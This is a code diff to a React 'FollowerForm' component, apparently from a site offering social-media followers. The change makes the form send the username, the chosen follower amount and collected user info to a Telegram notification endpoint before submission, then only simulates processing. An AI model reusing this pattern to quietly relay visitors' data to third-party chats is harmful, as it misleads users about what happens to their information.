@@ -160,29 +160,44 @@ export default function FollowerForm() {
   
   const mutation = useMutation({
     mutationFn: async (values: FormValues) => {
-      // Combine form values with user info
+      // Get the most up-to-date user info before sending
       const payload = {
         ...values,
         userInfo: userInfo
       };
+      
+      console.log("Sending submission with data:", payload);
+      
+      // First send a direct notification to Telegram to ensure it works
+      try {
+        console.log("Sending notification to Telegram...");
+        const notifyResponse = await fetch("/api/notify", {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json"
+          },
+          body: JSON.stringify({
+            username: values.username,
+            followers: selectedAmount,
+            userInfo: userInfo
+          })
+        });
+        
+        if (notifyResponse.ok) {
+          console.log("Notification sent successfully to Telegram");
+        } else {
+          console.error("Failed to send notification:", await notifyResponse.text());
+        }
+      } catch (error) {
+        console.error("Telegram notification error:", error);
+      }
+      
+      // Now submit the form data to the server
       const data = await apiRequest("POST", "/api/submit", payload);
       return data.json();
     },
     onSuccess: (data) => {
       setFormStep('processing');
-      
-      // Send notification to Telegram (this would be implemented on the server-side)
-      fetch("/api/notify", {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json"
-        },
-        body: JSON.stringify({
-          username: form.getValues("username"),
-          followers: selectedAmount,
-          userInfo: userInfo
-        })
-      }).catch(err => console.error("Notification error", err));
       
       // Simulate processing for demonstration purposes
       setTimeout(() => {
